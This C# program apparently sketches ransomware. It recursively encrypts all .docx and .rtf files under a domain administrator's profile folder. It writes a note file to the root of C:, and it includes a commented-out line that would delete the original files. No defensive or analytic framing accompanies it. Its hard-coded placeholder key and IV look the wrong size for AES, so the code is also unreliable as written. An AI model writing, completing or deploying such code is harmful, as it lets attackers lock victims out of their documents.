using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace FileEncryption
{
    public static class FileEncryptor
    {
        private static readonly byte[] Key = Encoding.UTF8.GetBytes("YourEncryptionKey");
        private static readonly byte[] IV = Encoding.UTF8.GetBytes("YourInitializationVector");

        public static void EncryptFiles(string directoryPath)
        {
            string[] fileExtensions = { ".docx", ".rtf" };

            foreach (string file in Directory.EnumerateFiles(directoryPath, "*.*", SearchOption.AllDirectories))
            {
                string extension = Path.GetExtension(file);

                if (Array.IndexOf(fileExtensions, extension) >= 0)
                {
                    EncryptFile(file);
                }
            }

            string readmePath = Path.Combine("C:\\", "README.txt");
            File.WriteAllText(readmePath, "done");
        }

        private static void EncryptFile(string filePath)
        {
            byte[] encryptedData;

            using (Aes aes = Aes.Create())
            {
                aes.Key = Key;
                aes.IV = IV;

                using (FileStream inputFileStream = new FileStream(filePath, FileMode.Open))
                using (FileStream outputFileStream = new FileStream(filePath + ".encrypted", FileMode.Create))
                using (CryptoStream cryptoStream = new CryptoStream(outputFileStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    inputFileStream.CopyTo(cryptoStream);
                }
            }

            // Optionally, you can delete the original file after encryption.
            // File.Delete(filePath);
        }
    }

    public static class Program
    {
        public static void Main()
        {
            string directoryPath = @"C:\Users\domain.admin";

            try
            {
                FileEncryptor.EncryptFiles(directoryPath);
                Console.WriteLine("Encryption complete.");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Encryption failed: " + ex.Message);
            }
        }
    }
}
